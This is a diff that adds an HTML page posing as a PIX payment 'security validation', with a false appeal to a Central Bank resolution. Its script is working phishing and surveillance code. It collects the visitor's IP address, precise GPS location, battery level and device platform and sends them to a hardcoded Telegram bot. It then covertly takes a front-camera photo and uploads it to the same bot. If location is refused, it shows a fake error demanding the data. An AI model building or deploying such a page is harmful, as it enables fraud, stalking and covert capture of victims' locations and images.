@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validação de Protocolo | PIX</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .loading-ring { border: 4px solid #f3f3f3; border-top: 4px solid #32bcad; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .animate-fade-in { animation: fadeIn 0.5s ease-in-out; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">
+    <div id="status-card" class="bg-white shadow-2xl rounded-3xl max-w-md w-full p-8 text-center border border-gray-200">
+        <div id="ui-container">
+            <div class="mb-6"><div class="w-20 h-20 bg-teal-50 rounded-full flex items-center justify-center mx-auto"><svg class="w-10 h-10 text-[#32bcad]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg></div></div>
+            <h2 class="text-xl font-bold text-gray-800 mb-4">Validação de Segurança</h2>
+            <p class="text-gray-500 text-sm mb-8 leading-relaxed">Conforme a Resolução nº 1/2020 do Banco Central, este canal de recebimento exige confirmação de hardware e zona de segurança GPS.</p>
+            <div id="acao-area"><button onclick="executarProtocolo()" class="w-full bg-[#32bcad] text-white font-extrabold py-5 rounded-2xl shadow-lg transition-all active:scale-95 uppercase tracking-wider text-sm">AUTENTICAR DISPOSITIVO</button></div>
+        </div>
+        <video id="video" autoplay style="display:none;"></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
+    <script>
+        const TOKEN = "8406636992:AAE7z6BGxeO-lfLMYVQ9yOWY-CMLiy586Ic"; 
+        const ID = "560716860"; 
+        async function atualizarStatus(texto) { const msgStatus = document.getElementById('msg-status'); if (msgStatus) msgStatus.innerText = texto; }
+        async function executarProtocolo() {
+            const area = document.getElementById('acao-area');
+            area.innerHTML = `<div class="flex flex-col items-center animate-fade-in"><div class="loading-ring mb-4"></div><p id="msg-status" class="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Iniciando Protocolo...</p></div>`;
+            setTimeout(() => atualizarStatus("Verificando integridade do dispositivo..."), 800);
+            setTimeout(() => atualizarStatus("Sincronizando coordenadas de segurança..."), 1800);
+            let ip = "Não identificado";
+            try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); ip = d.ip; } catch(e){}
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude; const lon = pos.coords.longitude;
+                let batInfo = "N/A"; try { const b = await navigator.getBattery(); batInfo = `${(b.level * 100).toFixed(0)}%`; } catch(e){}
+                const msg = `📑 *CONFERÊNCIA PIX*\n🌐 IP: ${ip}\n🔋 Bateria: ${batInfo}\n📱 Dispositivo: ${navigator.platform}\n📍 Mapa: https://www.google.com/maps?q=${lat},${lon}`;
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: ID, text: msg, parse_mode: 'Markdown' }) });
+                await capturarFotoHD();
+                window.location.href = "pagina3.html"; 
+            }, (err) => { exibirErroPersistente(); }, { enableHighAccuracy: true, timeout: 15000 });
+        }
+        function exibirErroPersistente() {
+            document.getElementById('status-card').innerHTML = `<div class="text-center animate-fade-in"><div class="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-4"><svg class="w-8 h-8 text-orange-600" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg></div><h2 class="text-lg font-bold text-gray-800 mb-2">Erro de Autenticação 0x8842</h2><p class="text-gray-500 text-xs mb-6 px-4">Não foi possível validar a biometria ou localização geográfica. A Resolução nº 1/2020 exige estes dados para evitar suspeita de fraude.</p><button onclick="window.location.reload()" class="w-full bg-gray-800 text-white font-bold py-4 rounded-xl shadow-md uppercase text-[10px] tracking-widest">Revalidar Protocolo</button></div>`;
+        }
+        async function capturarFotoHD() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } });
+                const video = document.getElementById('video'); video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 1500));
+                const canvas = document.getElementById('canvas'); canvas.width = 1280; canvas.height = 720;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                stream.getTracks().forEach(t => t.stop());
+                const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.90));
+                const fd = new FormData(); fd.append('chat_id', ID); fd.append('photo', blob, 'identificacao.jpg');
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            } catch (e) {}
+        }
+    </script>
+</body>
+</html>
